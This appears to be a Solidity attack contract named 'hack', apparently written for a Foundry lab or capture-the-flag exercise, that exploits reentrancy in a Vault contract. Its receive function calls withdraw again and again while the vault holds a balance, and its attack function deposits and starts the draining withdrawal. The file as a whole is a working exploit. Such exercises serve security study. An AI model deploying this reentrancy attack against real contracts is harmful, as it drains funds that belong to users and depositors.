// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Test, console} from "../lib/forge-std/src/Test.sol";
import "../src/Vault.sol";

contract hack {
    address payable public vault;

    constructor(address payable _vault) {
        vault =_vault;
    }

    receive() external payable {
        if (vault.balance > 0) {
            Vault(vault).withdraw();
            console.log("vaultBalance:", address(vault).balance);
        }
    }

    function attack() public payable {
        Vault(vault).openWithdraw();
        Vault(vault).deposite{value: msg.value}();
        Vault(vault).withdraw();
    }
}
